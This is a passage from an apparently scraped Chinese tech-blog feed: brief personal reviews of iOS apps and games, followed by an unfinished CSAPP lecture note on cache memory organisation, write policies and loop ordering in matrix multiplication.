<p><img src="/images/14559844176390.jpg" alt=""></p>
<p>Expenses OK</p>
<p>记账软件图标真的都太像了，不信等下又有一个</p>
<hr>
<p><img src="/images/14559844283046.jpg" alt=""></p>
<p>Paint FX</p>
<p>修图软件，不过感觉对功底有一定要求，所以我就算了</p>
<hr>
<p><img src="/images/14559844397929.jpg" alt=""></p>
<p>Spendee</p>
<p>看，又一个记账软件，不过这个我还确实是用了一段时间的，发现，我就这么点钱，不用记账软件也知道钱花到哪里去了，唉</p>
<h2 id="16__u5E74_2__u6708_16__u65E5"><a href="#16__u5E74_2__u6708_16__u65E5" class="headerlink" title="16 年 2 月 16 日"></a>16 年 2 月 16 日</h2><p><img src="/images/14556379936188.jpg" alt=""></p>
<p>iDaily·每日环球视野</p>
<p>我基本就看看图，存存壁纸，但是现在我都用默认的壁纸了，也就不用了</p>
<hr>
<p><img src="/images/14556380070431.jpg" alt=""></p>
<p>SuperMemo</p>
<p>说白了就是记忆卡片，不过我始终静不下心背单词（或者其他），只是稍微尝试了一下，据说背后的算法很牛，不过没怎么体会到就是了。</p>
<hr>
<p><img src="/images/14556380356757.jpg" alt=""></p>
<p>Discovr</p>
<p>发现音乐的，找到不同歌手的联系，不过感觉对华语乐坛支持比较差，希望外国歌曲的盆友可以搞起</p>
<hr>
<p><img src="/images/14556380923184.jpg" alt=""></p>
<p>myUnit·Global Unit Converter</p>
<p>单位转换，这类应用基本就是拼界面了，这个因为是四叶草出品的，还是比较有保证的。</p>
<hr>
<p><img src="/images/14556381114390.jpg" alt=""></p>
<p>Forest: Stay focused</p>
<p>简单来说就是『封印』手机，我的感觉是不必有强迫症，感觉控制不住自己的时候用用就好。</p>
<hr>
<p><img src="/images/14556381202296.jpg" alt=""></p>
<p>Keep - 移动健身教练</p>
<p>美女帅哥很多，各个身材都比我好，但是人懒起来，就是不运动，你说怎么办！</p>
<hr>
<p><img src="/images/14556381707433.jpg" alt=""></p>
<p>53 Paper - Notes</p>
<p>非常文艺的画画记笔记软件，看这个介绍就知道跟我没啥关系了，因为我并不会画画。不过动画效果一流，看看还是不错的。</p>
<hr>
<p><img src="/images/14556381804646.jpg" alt=""></p>
<p>CalCube</p>
<p>立方体计算器，本质还是计算器呗，动画效果特别一些</p>
<hr>
<p><img src="/images/14556381980813.jpg" alt=""></p>
<p>NextDay</p>
<p>每天一张图一段话，文艺小清新，就是这个意思。</p>
<hr>
<p><img src="/images/14556382182817.jpg" alt=""></p>
<p>食色</p>
<p>一开始用得比较多，但是后来基本沦为修图软件，再后来图都懒得修了，晒吃总不能天天晒，那么不晒的时候我干嘛要看别人晒折磨自己。</p>
<hr>
<p><img src="/images/14556382269782.jpg" alt=""></p>
<p>The Great Photo App</p>
<p>手把手教你拍照，互动很不错，专业性也没有什么问题，就是更新太慢</p>
<hr>
<p><img src="/images/14556382681077.jpg" alt=""></p>
<p>图解电影</p>
<p>标题非常简明扼要，对我来说的好处就是，有些不敢看的恐怖片，可以看静态图过过瘾，毕竟没有那么可怕了</p>
<hr>
<p><img src="/images/14556383281179.jpg" alt=""></p>
<p>Polarr Photo Editor</p>
<p>总体感觉是功能很强大，但是上手难度太大，我一直就没怎么学会。</p>
<hr>
<p><img src="/images/14556383627121.jpg" alt=""></p>
<p>Light</p>
<p>网易出品的精选新闻，可以评论某一个段落或者图片什么的，打发时间。</p>
<hr>
<p><img src="/images/14556383931838.jpg" alt=""></p>
<p>DailyCost</p>
<p>之前自己在用的记账软件，界面比较清晰也挺好用，不过现在感觉还是刷卡的时候让信用卡账单自动记账比较省事儿。</p>
<hr>
<p><img src="/images/14556384034802.jpg" alt=""></p>
<p>Calculator ‘3’</p>
<p>这年头计算器花样太多，不过我最常用的还是原生自带的，这个功能挺强大的，感兴趣可以试一试。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 应用，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>]]>
    
    </summary>
    
      <category term="iOS" scheme="http://wdxtub.com/tags/iOS/"/>
    
      <category term="应用" scheme="http://wdxtub.com/tags/%E5%BA%94%E7%94%A8/"/>
    
      <category term="评测" scheme="http://wdxtub.com/tags/%E8%AF%84%E6%B5%8B/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[iOS 游戏简评]]></title>
    <link href="http://wdxtub.com/2016/02/16/ios-game-short-review/"/>
    <id>http://wdxtub.com/2016/02/16/ios-game-short-review/</id>
    <published>2016-02-16T15:34:25.000Z</published>
    <updated>2016-02-20T18:09:14.000Z</updated>
    <content type="html"><![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 游戏，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>
<a id="more"></a>
<hr>
<h2 id="u5199_u5728_u524D_u9762"><a href="#u5199_u5728_u524D_u9762" class="headerlink" title="写在前面"></a>写在前面</h2><ul>
<li>入选标准纯主观</li>
<li>按自然顺序排列（就是瞎排，没有类别和时间顺序）</li>
<li>不会有截图，只有图标</li>
<li>评测标准纯主观，具体评测角度看心情</li>
<li>一分钱广告费没有拿，没有利益相关</li>
<li>部分内容可能因为记忆偏差或者游戏更新而不一致，不要在意这些细节</li>
<li>基本都是中国区的游戏，例外会特别标出</li>
<li>想到了再多加几条显得既随性又专业</li>
</ul>
<h2 id="16__u5E74_2__u6708_20__u65E5"><a href="#16__u5E74_2__u6708_20__u65E5" class="headerlink" title="16 年 2 月 20 日"></a>16 年 2 月 20 日</h2><p><img src="/images/14559836509210.jpg" alt=""></p>
<p>AERENA - Clash of Champions</p>
<p>画面超级赞的走格子对战游戏，人物动作场景什么都很精美，上乘</p>
<hr>
<p><img src="/images/14559836595602.jpg" alt=""></p>
<p>愤怒的小鸟思黛拉</p>
<p>出来骗钱的一作，换个颜色难道我就不认识了嘛？</p>
<hr>
<p><img src="/images/14559836772410.jpg" alt=""></p>
<p>Zombie Highway</p>
<p>路怒症丧尸爱好者福音！根本停不下来，这个题材基本上只有他们一家在做，不过玩久了还是有点无聊——丧尸到后面实在是太强了</p>
<hr>
<p><img src="/images/14559837761722.jpg" alt=""></p>
<p>Bug Princess</p>
<p>叫『虫姬』就懂了，弹幕游戏扛鼎之作，不黑不吹</p>
<hr>
<p><img src="/images/14559837882605.jpg" alt=""></p>
<p>Wind-up Knight 2</p>
<p>小小骑士 2，操作简单，玩法也还算多样，不错的休闲游戏</p>
<hr>
<p><img src="/images/14559837951722.jpg" alt=""></p>
<p>jukebeat</p>
<p>音乐节拍游戏新形态，不得不说，除了心疼屏幕，还真的是好玩，虽然我依然最爱 psp 上的 djmax portable 2</p>
<hr>
<p><img src="/images/14559838101240.jpg" alt=""></p>
<p>Overkill 2</p>
<p>狙击游戏之一，玩多了同质化明显，ready - steady - shoot!</p>
<hr>
<p><img src="/images/14559838244581.jpg" alt=""></p>
<p>Rayman Jungle Run</p>
<p>雷曼家族一年一作系列，质量有保证，但是，看多了还是腻歪</p>
<hr>
<p><img src="/images/14559838419675.jpg" alt=""></p>
<p>Sky Gambler Air Supremacy</p>
<p>苹果推荐的空战游戏，不过实话说，离皇牌空战还是差距比较大，我表示玩不下去</p>
<hr>
<p><img src="/images/14559838707926.jpg" alt=""></p>
<p>LONEWOLF</p>
<p>又是一个狙击游戏，换换模型换换枪，其他一样</p>
<hr>
<p><img src="/images/14559839437614.jpg" alt=""></p>
<p>Agent Dash</p>
<p>我觉得画风什么的比 Temple Run 都好，但是毕竟是跟风之作没办法这么火，解锁的妹子角色那叫一个火辣，我喜欢</p>
<hr>
<p><img src="/images/14559839515923.jpg" alt=""></p>
<p>FRAMED</p>
<p>创意爆炸的游戏，不是年度最佳不科学，真的很想自己也做一个这么独特的游戏</p>
<hr>
<p><img src="/images/14559839605619.jpg" alt=""></p>
<p>Madcoaster</p>
<p>还是当年的过山车！还是当年的味道！</p>
<hr>
<p><img src="/images/14559839698033.jpg" alt=""></p>
<p>Flight Control Rocket</p>
<p>把飞机换成了火箭，但是游戏模式还是一个样，所以，还是很容易腻</p>
<hr>
<p><img src="/images/14559839792834.jpg" alt=""></p>
<p>Nuts!: Infinite Forest Run</p>
<p>一只松鼠一直往上爬，还是基本的跑酷游戏，不知道为啥我玩久了会晕，怪</p>
<hr>
<p><img src="/images/14559840043887.jpg" alt=""></p>
<p>Grimm</p>
<p>画风诡异的横版过关游戏，推个婴儿车还甩来甩去真的有点难以接受</p>
<hr>
<p><img src="/images/14559840156367.jpg" alt=""></p>
<p>Warhammer Quest</p>
<p>战锤系列质量一如既往的高，喜欢这个系列</p>
<hr>
<p><img src="/images/14559840305175.jpg" alt=""></p>
<p>Blek</p>
<p>超级烧脑的益智游戏！人工配音有点恶趣味也有点搞笑！至今未能通关</p>
<hr>
<p><img src="/images/14559840404204.jpg" alt=""></p>
<p>Warhammer 40000</p>
<p>印象中是第一个用上 3D touch 的游戏，靠谱，引领风潮，而且非常自然不是强行加特性的那种</p>
<hr>
<p><img src="/images/14559840709495.jpg" alt=""></p>
<p>GRAVITY: DON’T LET GO</p>
<p>很难操作，感觉完美还原了太空中移动的无力感</p>
<hr>
<p><img src="/images/14559840836616.jpg" alt=""></p>
<p>MUJO</p>
<p>这个游戏看图标保准大部分人猜不出来是干嘛的，结果就是三消</p>
<hr>
<p><img src="/images/14559840931099.jpg" alt=""></p>
<p>Block Fortress</p>
<p>Minecraft 类似游戏，不过新手指引做得不知所云，没搞懂在玩啥</p>
<hr>
<p><img src="/images/14559841080068.jpg" alt=""></p>
<p>BIT.TRIP RUN!</p>
<p>画风非常花哨的游戏，亮瞎眼，但是人物设计和动作都很搞笑，赞</p>
<hr>
<p><img src="/images/14559841493700.jpg" alt=""></p>
<p>Rolling Kongs</p>
<p>蛮有创意的转转消游戏，不过图标太丑</p>
<hr>
<p><img src="/images/14559841805459.jpg" alt=""></p>
<p>Dungeon Hunter 4</p>
<p>地牢系列第四作，消磨时间杠杠的，基本上中规中矩</p>
<hr>
<p><img src="/images/14559841894346.jpg" alt=""></p>
<p>Temple Run</p>
<p>洗脑游戏，不过后期有些创新，但是似乎无法复制当时的奇迹，招聘会的时候还见到他们来着，不过只招美国人</p>
<hr>
<p><img src="/images/14559841971361.jpg" alt=""></p>
<p>DEAD TARGET: Zombie</p>
<p>为什么要拿出来了，真的是图标太丑….</p>
<hr>
<p><img src="/images/14559842226821.jpg" alt=""></p>
<p>Tower Madness 2</p>
<p>比较好的 3D 塔防，值得玩一玩</p>
<hr>
<p><img src="/images/14559842379720.jpg" alt=""></p>
<p>MAYDAY!</p>
<p>紧急迫降的游戏，实话说真的不好操控，非常需要熟能生巧</p>
<hr>
<p><img src="/images/14559842477229.jpg" alt=""></p>
<p>Blood Roofs</p>
<p>这是第一次在手机上见到这么『油腻』的画风，抱着妹子还能在屋顶上跳来跳去，总体来说很重口</p>
<hr>
<p><img src="/images/14559842548228.jpg" alt=""></p>
<p>Save a Rhino</p>
<p>环保游戏，跑酷中感受犀牛</p>
<hr>
<p><img src="/images/14559842737882.jpg" alt=""></p>
<p>Superbrothers</p>
<p>非常经典的 RPG，画风独特，剧情一流，虽然我现在还没通关</p>
<hr>
<p><img src="/images/14559843263974.jpg" alt=""></p>
<p>Infinity Blade III</p>
<p>炫技游戏，主要是展示下引擎，玩法基本来说比较无趣，第三代也是那么无趣</p>
<hr>
<p><img src="/images/14559843338055.jpg" alt=""></p>
<p>Snapimals</p>
<p>画风有趣，动物很萌，可是收集起来很花时间，给动物拍照还是挺不错的创意</p>
<hr>
<p><img src="/images/14559843629122.jpg" alt=""></p>
<p>EPOCH 2</p>
<p>类似以前的街机游戏，打打打突突突，还是不错的</p>
<hr>
<p><img src="/images/14559843699736.jpg" alt=""></p>
<p>Twin Shooter - Invaders</p>
<p>这个游戏告诉我们不坑钱同样能做出好游戏，好的打飞机游戏</p>
<hr>
<p><img src="/images/14559844110880.jpg" alt=""></p>
<p>Jetpack Joyride</p>
<p>这个超级好玩，half brick 是个靠谱的公司，不过最近更新之后也变得坑钱向了，不能愉快玩耍了。</p>
<h2 id="16__u5E74_2__u6708_16__u65E5"><a href="#16__u5E74_2__u6708_16__u65E5" class="headerlink" title="16 年 2 月 16 日"></a>16 年 2 月 16 日</h2><p><img src="/images/14556380188112.jpg" alt=""></p>
<p>3D Badminton</p>
<p>整体来说手感不错，手指当球拍，划不同区域不同力度就相当于跑位和击球方式了，不过因为我对羽毛球真的是略懂，所以觉得其实和其他球类游戏差别不大，估计改改参数就可以做成乒乓球排球网球，反正只要是有网的竞技体育就行。</p>
<hr>
<p><img src="/images/14556380616375.jpg" alt=""></p>
<p>Flight Control</p>
<p>经典的上古级游戏，记得当时我还玩得很上瘾，根本停不下来，不过后面因为玩法变化太小玩多了难免有那么一个瞬间觉得『啊这有什么好玩啊』，然后就不继续玩了</p>
<hr>
<p><img src="/images/14556380714213.jpg" alt=""></p>
<p>A Dark Room</p>
<p>恐怖游戏一直不是我的菜，实在是联想能力太强，晚上果断睡不着觉，不过整体氛围还是不错的。</p>
<hr>
<p><img src="/images/14556380782615.jpg" alt=""></p>
<p>Broken Sword 2</p>
<p>也是比较早的游戏了，动画片画风略微有点违和，不过习惯了之后感觉还是挺不错的，标准的剧情解密，谜题设计得还算不错，值得玩一玩。</p>
<hr>
<p><img src="/images/14556380855019.jpg" alt=""></p>
<p>Flappy Bird</p>
<p>洗脑游戏，一句话就可以说清楚玩的感受『看起来这么蠢的游戏我竟然只能得个位数分数，这不科学我不服』</p>
<hr>
<p><img src="/images/14556381036144.jpg" alt=""></p>
<p>OPUS: The Day We Found Earth</p>
<p>非常文艺的游戏，就是孤独的小机器人在茫茫宇宙中找寻适合人类居住的星球，需要一定情怀和耐心。</p>
<hr>
<p><img src="/images/14556381272633.jpg" alt=""></p>
<p>Burn it Down</p>
<p>一开始玩感觉还不错，后面进入恐怖模式了，我就又不敢玩了，横版过关。</p>
<hr>
<p><img src="/images/14556381549828.jpg" alt=""></p>
<p>ZENFORMS: Protectors</p>
<p>既然任天堂不在手机上出宠物小精灵，那么肯定就会有后来者满足大家愿望，这个就是了。</p>
<hr>
<p><img src="/images/14556381633213.jpg" alt=""></p>
<p>Skyward</p>
<p>看图标就知道，纪念碑谷之后这类画风的游戏就流行起来了，但是玩法和纪念碑谷是万万不同的。</p>
<hr>
<p><img src="/images/14556381906331.jpg" alt=""></p>
<p>Turbo Dismount</p>
<p>物理学自虐游戏，这个是第二作，花样在马路上作死，发泄起来还是很爽的。</p>
<hr>
<p><img src="/images/14556382087935.jpg" alt=""></p>
<p>Tap ‘n Slash</p>
<p>非常简单粗暴的小游戏，沿着对角线走走砍砍，熟能生巧，不过像素风格还是比较有趣的</p>
<hr>
<p><img src="/images/14556382361373.jpg" alt=""></p>
<p>Towers Infinite</p>
<p>从前还是在索爱上玩过的盖楼，现在出了高清无尽版，不过还是怀旧成分比较多。</p>
<hr>
<p><img src="/images/14556382432271.jpg" alt=""></p>
<p>Rayman Fiesta Run</p>
<p>雷曼系列跑酷，质量一流，收集癖慎玩，很容易发生因为没有收集完在一关死循环的情况。</p>
<hr>
<p><img src="/images/14556382529865.jpg" alt=""></p>
<p>The Sandbo - Build&amp; Create</p>
<p>沙盒造物主系列，像素风，我个人对这个类型游戏比较一般。</p>
<hr>
<p><img src="/images/14556382612517.jpg" alt=""></p>
<p>rop</p>
<p>切完糖果可以切绳子！基本来说就是基于物理规则的益智游戏</p>
<hr>
<p><img src="/images/14556382759883.jpg" alt=""></p>
<p>Super Hexagon</p>
<p>非常考验反应力，而且多边形大色块很容易让人意乱神迷，洗脑游戏 </p>
<hr>
<p><img src="/images/14556382823039.jpg" alt=""></p>
<p>FOTONICA</p>
<p>第一人称线条型跑酷，超级狂拽酷炫，音乐也是亮点</p>
<p><img src="/images/14556382896123.jpg" alt=""></p>
<p>Call of Mini: Dino Hunter</p>
<p>打完僵尸打恐龙，其实差不多是一个意思，喜欢左右摇杆射击可以试试看。</p>
<hr>
<p><img src="/images/14556382987408.jpg" alt=""></p>
<p>Angry Birds Star Wars II</p>
<p>愤怒小鸟主题游戏第 N 波，我向来不是特别感冒</p>
<hr>
<p><img src="/images/14556383193105.jpg" alt=""></p>
<p>Assassin’s Creed Pirates</p>
<p>刺客信条海战系列，总体来说还原得不错，不过从大航海时代我就是海战苦手，过过过。</p>
<hr>
<p><img src="/images/14556383343499.jpg" alt=""></p>
<p>OLO game</p>
<p>画面清新玩法简单非常适合情侣虐狗的游戏，就是这样。</p>
<hr>
<p><img src="/images/14556383492141.jpg" alt=""></p>
<p>Doodle Jump</p>
<p>也是上古游戏列表中的知名一员，重力感应跳跳跳，玩久了很容易无聊。</p>
<hr>
<p><img src="/images/14556383552948.jpg" alt=""></p>
<p>Eternity Warriors 3</p>
<p>可能是 glu 最后一款这样的大作了？只能说在手机上我玩不来这个类型游戏，太累。</p>
<hr>
<p><img src="/images/14556383711674.jpg" alt=""></p>
<p>Assassin’s Creed Recollection</p>
<p>非常有创意的卡牌对战游戏，我觉得和炉石传说相比一点都不逊色，而且刺客明显更酷嘛。</p>
<hr>
<p><img src="/images/14556383809420.jpg" alt=""></p>
<p>Edge</p>
<p>又是一个画面洗脑的游戏，看久了不知道为啥就会感觉不大舒服，多边形益智类，你懂的。</p>
<hr>
<p><img src="/images/14556383870555.jpg" alt=""></p>
<p>Skiing Yeti Mountain</p>
<p>虽然不知道是什么山，但是这个山上出了很多人命是一定的，手感真的非常不错，滑雪控不要错过</p>
<hr>
<p><img src="/images/14556384107682.jpg" alt=""></p>
<p>Radiation Island</p>
<p>辐射岛，可能是最近玩过的手机平台上最 hard core 的游戏了，不过需要很多心思，没啥时间深入感受</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这个系列主要是记录一下自己玩过的众多 iOS 游戏，因为时间和篇幅所限，每个游戏可能只会用几句话简单评测，当然，某些我觉得值得单独拉出来评测的，还是会专门进行介绍的。</p>]]>
    
    </summary>
    
      <category term="iOS" scheme="http://wdxtub.com/tags/iOS/"/>
    
      <category term="游戏" scheme="http://wdxtub.com/tags/%E6%B8%B8%E6%88%8F/"/>
    
      <category term="评测" scheme="http://wdxtub.com/tags/%E8%AF%84%E6%B5%8B/"/>
    
      <category term="Game" scheme="http://wdxtub.com/categories/Game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 第 12 课 Cache Memories]]></title>
    <link href="http://wdxtub.com/2016/02/15/csapp-12/"/>
    <id>http://wdxtub.com/2016/02/15/csapp-12/</id>
    <published>2016-02-15T15:15:18.000Z</published>
    <updated>2016-02-16T15:11:46.000Z</updated>
    <content type="html"><![CDATA[<p>上一讲我们了解了存储的相关知识，这节课我们来更加深入研究一下 cache memory 的知识。</p>
<a id="more"></a>
<hr>
<p>Cache memory 是由硬件自动管理的 SRAM 内存，CPU 会首先从这里找数据，其所处的位置如下：</p>
<p><img src="/images/14555689621035.jpg" alt=""></p>
<p><strong>General Cache Organization(S, E, B)</strong></p>
<p>通常来说，是按照如下图所示的方式来组织的，一定要注意 S/E/B 具体在说什么：</p>
<p><img src="/images/14555690389309.jpg" alt=""></p>
<p>实际上可以理解为三种层级关系，对应不同的索引，这样分层的好处在于，通过层级关系简化搜索需要的时间，并且和字节的排布也是一一对应的（之后介绍缓存的时候就体现得更加明显）。</p>
<h2 id="u8BFB_u5165"><a href="#u8BFB_u5165" class="headerlink" title="读入"></a>读入</h2><p><img src="/images/14556253748808.jpg" alt=""></p>
<p>具体在从缓存中读取一个地址时，首先我们通过 set index 确定要在哪个 set 中寻找，确定后利用 tag 和同一个 set 中的每个 line 进行比对，找到 tag 相同的那个 line，最后再根据 block offset 确定要从 line 的哪个位置读起（这里的而 line 和 block 是一个意思）。</p>
<p>当 E=1 时，也就是每个 set 只有 1 个 line 的时候，称之为直接映射缓存(Direct Mapped Cache)。</p>
<p><img src="/images/14556267189507.jpg" alt=""></p>
<p>这种情况下，因为每个 set 对应 1 个 line，反过来看，1 个 line 就需要一个 set，所以 set index 的位数就会较多（和之后的多路映射对比）。具体的检索过程就是先通过 set index 确定哪个 set，然后看是否 valid，然后比较那个 set 里唯一 line 的 tag 和地址的 t bits 是否一致，就可以确定是否缓存命中。</p>
<p><img src="/images/14556274155804.jpg" alt=""></p>
<p>命中之后根据 block offset 确定偏移量，因为需要读入一个 int，所以会读入 4 5 6 7 这四个字节（假设缓存是 8 个字节）。如果 tag 不匹配的话，这行会被扔掉并放新的数据进来。</p>
<p>这里举一个具体的例子</p>
<p><img src="/images/14556275938967.jpg" alt=""></p>
<p>缓存的大小如图所示，对应就是有 4 个 set，所以需要 2 位的 set index，所以进行读入的时候，会根据中间两位来确定在哪个 set 中查找，其中 8 和 0，因为中间两位相同，会产生冲突，导致连续 miss，这个问题可以用多路映射来解决。</p>
<p>当 E 大于 1 时，也就是每个 set 有 E 个 line 的时候，称之为 E-way Set Associative Cache。这里用 E = 2 来做例子：</p>
<p><img src="/images/14556282750323.jpg" alt=""></p>
<p>跟前面所说的一致，这里每个 set 有两个 line，所以就没有那么多 set，也就是说说 set index 可以少一位（之后的例子可以看到）</p>
<p><img src="/images/14556285710342.jpg" alt=""></p>
<p>再简述一下整个过程，先从 set index 确定那个 set，然后看 valid 位，接着利用 t bits 分别和每个 line 的 tag 进行比较，如果匹配则命中，那么返回 4 5 位置的数据，如果不匹配，就需要替换，可以随机替换，也可以用 least recently used(LRU) 来进行替换。下面是一个具体的例子：</p>
<p><img src="/images/14556295742803.jpg" alt=""></p>
<p>可以看到因为每个 set 有 2 个 line，所以只有 2 个 set，set index 也只需要 1 位了，这个情况下即使 8 和 0 的 set index 一致，因为一个 set 可以容纳两个数据，所以最后一次访问 0，就不会 miss 了。</p>
<h2 id="u5199_u5165"><a href="#u5199_u5165" class="headerlink" title="写入"></a>写入</h2><p>在整个 memory hierarchy 中，不同的层级可能会存放同一个数据的不同拷贝（如 L1, L2, L3, 主内存, 硬盘）。如果发生写入命中的时候（也就是要写入的地址在缓存中有），有两种策略：</p>
<ul>
<li>Write-through: 命中后更新缓存，同时写入到内存中</li>
<li>Write-back: 直到这个缓存需要被指环出去，才写入到内存中（需要额外的 dirty bit 来表示缓存中的数据是否和内存中相同，因为可能在其他的时候内存中对应地址的数据已经更新，那么重复写入就会导致原有数据丢失）</li>
</ul>
<p>在写入 miss 的时候，同样有两种方式：</p>
<ul>
<li>Write-allocate: 载入到缓存中，并更新缓存（如果之后还需要对其操作，这个方式就比较好）</li>
<li>No-write-allocate: 直接写入到内存中，不载入到缓存 </li>
</ul>
<p>这四种策略通常的搭配是：</p>
<ul>
<li>Write-through + No-wirte-allocate</li>
<li>Write-back + Write-allocate</li>
</ul>
<p>其中第一种可以保证绝对的数据一致性，第二种效率会比较高（通常情况下）。</p>
<h2 id="u5B9E_u4F8B_u5B66_u4E60_uFF1AIntel_Core_i7"><a href="#u5B9E_u4F8B_u5B66_u4E60_uFF1AIntel_Core_i7" class="headerlink" title="实例学习：Intel Core i7"></a>实例学习：Intel Core i7</h2><p>Intel Core i7 的 cache hierarchy 如下图所示：</p>
<p><img src="/images/14556301866362.jpg" alt=""></p>
<p>我们通常用如下的指标来评价缓存的性能：</p>
<ul>
<li>Miss Rate<ul>
<li>1 - hit rate</li>
<li>对于 L1 来说一般 3-10%</li>
<li>对于 L2 来说很小 &lt; 1%</li>
<li>也就是说大部分时间堆数据的访问都是极快的</li>
</ul>
</li>
<li>Hit Time<ul>
<li>把 1 个 line 的缓存传输给处理器所用的时间，包括判断其是否在缓存中这个过程</li>
<li>对于 L1 来说一般 4 个时钟周期</li>
<li>对于 L2 来说一般 10 个时钟周期</li>
</ul>
</li>
<li>Miss Penalty<ul>
<li>因为 miss 所需要花费的额外时间</li>
<li>一般来说需要 50-200 个时钟周期（因为要读内存，而且由于处理器速度越来越快，这个时间还在增长）</li>
</ul>
</li>
</ul>
<p>从前面的数据中，我们可以看出，hit 和 miss 所需要的时间是天壤之别（只看 L1 和主存的话，可能差 100 倍）。</p>
<p>还有一个比较有意思的现象是，99% 的命中率，是 97% 的命中率的性能的两倍。举个例子，假设缓存命中时需要 1 个周期，而 miss penalty 是 100 个周期，那么</p>
<ul>
<li>97% hits: 1 cycle + 0.03 x 100 cycles = 4 cycles</li>
<li>99% hits: 1 cycle + 0.01 x 100 cycles = 2 cycles</li>
</ul>
<p>这也是为什么我们用 miss rate 而不是 hit rate，因为更能体现出倍数的关系。</p>
<h2 id="Memory_mountain"><a href="#Memory_mountain" class="headerlink" title="Memory mountain"></a>Memory mountain</h2><p>我们用每秒从内存中读入的字节数目来衡量内存的性能（单位 MB/s），根据 spatial 和 temporal locality 的特性，我们可以画出一幅立体的表现性能走向的图，具体用的测试代码为：</p>
<p><img src="/images/14556314610621.jpg" alt=""></p>
<p>可以得到这么一幅图</p>
<p><img src="/images/14556314890158.jpg" alt=""></p>
<p>注意，这是根据 Core i7 得出来的图，不同的处理器可能因为不同的设计和架构而有所区别，但是可以通过不同的颜色和层次，看出不同 size 和 stride 对性能的影响。山脚是我们应该尽量避免的，山顶是我们力求达到的，也就是说，尽量一次访问一个 stride，一次读入的数据大小也不宜太大，最好和 L1 缓存数值上吻合。</p>
<h2 id="u77E9_u9635_u76F8_u4E58"><a href="#u77E9_u9635_u76F8_u4E58" class="headerlink" title="矩阵相乘"></a>矩阵相乘</h2><p>矩阵相乘是学习缓存非常好的例子，这里给出一些条件：</p>
<ul>
<li>两个 N x N 的矩阵相乘，N 非常大，所以可以认为 1/N 等于 0</li>
<li>矩阵的每个元素是 double，也就是 8 个字节</li>
<li>一共需要 $O(n^3)$ 次操作</li>
<li>源矩阵的每个元素需要被读入 N 次</li>
<li>目标矩阵的每个元素要被写入 N 次（相加），但是可以在寄存器中完成</li>
<li>缓存中每 1 个 line 的大小是 32 个字节（足够放下 4 个 double）</li>
<li>缓存可能至多能容纳矩阵的一行（甚至只能是一行的一部分）</li>
</ul>
<h3 id="u66F4_u6539_u5FAA_u73AF_u987A_u5E8F_u63D0_u9AD8_spatial_locality"><a href="#u66F4_u6539_u5FAA_u73AF_u987A_u5E8F_u63D0_u9AD8_spatial_locality" class="headerlink" title="更改循环顺序提高 spatial locality"></a>更改循环顺序提高 spatial locality</h3><p>一种算法是这样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* ijk */</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">        sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            sum += a[i][k] * b[k][j];</span><br><span class="line">        c[i][j] = sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察里面的循环，大概的访问模式是这样的：</p>
<p><img src="/images/14556324266700.jpg" alt=""></p>
<p>因为 C 语言是根据行来分配数组内存的，所以按照列的顺序来访问，可以得到最好的 spatial locality。假设我们需要读入 N 个连续的字节，如果缓存的 block 大小为 B 个字节，那么实际上真正需要去内存中访问是 N/B 次（这种时候会 miss）。但是如果按照行来访问，每次都是跳着来，miss rate 就是百分之百。</p>
<p><img src="/images/14556327200253.jpg" alt=""></p>
<p>而 <code>ijk</code> 的访问模式，处理矩阵 A 的时候是按列访问的，因为这里设定一个 block 可以存放 4 个 double，读入每四个元素的情况下，我们只会在读入第一个 double 的时候 miss，所以对于矩阵 A 来说，内部的循环（就是 k 的那个循环）每次迭代平均会 miss 0.25 次（就是 1/4 次）。而访问矩阵 B 的时候，因为是按照行访问的，缓存实际上没有任何用，同样的条件下，每次迭代都会 miss。（我们还可以发现 <code>jik</code> 的访问模式和 <code>ijk</code> 很类似，这里略过）</p>
<p>但是如果换一下顺序，变成 <code>kij</code> 的访问模式，就会有不一样的变化，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* kij */</span></span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (i =<span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        r = a[i][k];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            c[i][j] += r * b[k][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的访问模式：</p>
<p><img src="/images/14556331411420.jpg" alt=""></p>
<p>可以看到对于矩阵 B 和 C 来说都是按照列访问的（就是横着），所以内循环中每次迭代只会 miss 0.25 次（<code>ikj</code> 的访问模式也是如此）</p>
<p>当然还可以使用 <code>jki</code> 或 <code>kji</code> 的访问模式，这种模式下对于矩阵 A 和 C 的访问都是按行访问的（就是竖着），内循环中每次迭代都会 miss 1 次，是很糟糕的</p>
<p>比较一下：</p>
<p><img src="/images/14556333212757.jpg" alt=""></p>
<p>就可以发现不同的访问模式会产生巨大的影响，下面的表格更加能说明问题：</p>
